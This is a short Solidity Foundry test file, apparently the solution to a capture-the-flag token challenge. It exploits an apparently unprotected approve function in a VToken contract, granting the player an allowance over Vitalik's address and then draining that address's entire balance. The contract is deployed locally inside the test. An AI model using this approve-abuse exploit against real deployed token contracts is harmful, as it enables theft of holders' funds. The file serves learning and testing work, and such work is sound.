// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "./VToken.sol";

contract VTokenExploitTest is Test {
    address playerAddress = makeAddr("player");
    address vitalikAddress = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

    function test() public {
        VToken vToken = new VToken();
        vm.startPrank(playerAddress, playerAddress);

        vToken.approve(vitalikAddress, playerAddress, type(uint256).max);
        vToken.transferFrom(vitalikAddress, playerAddress, vToken.balanceOf(vitalikAddress));

        vm.stopPrank();
        assertEq(vToken.balanceOf(playerAddress), vToken.totalSupply(), "you must get all the tokens");
    }
}
